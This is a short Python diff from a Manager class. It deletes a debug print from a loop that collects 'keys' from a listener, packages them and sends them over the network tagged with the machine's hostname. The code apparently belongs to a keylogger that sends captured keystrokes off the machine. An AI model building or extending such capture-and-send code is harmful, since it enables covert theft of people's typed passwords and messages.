@@ -30,7 +30,6 @@ class Manager:
             temp_data = self.listener.get_keys()
             if temp_data:
                 data = Package(temp_data)
-                print(data)
                 data = str(data.export_package())
                 nw = NetworkWriter()
                 nw.send_data({"machine": hostname,"data": data})
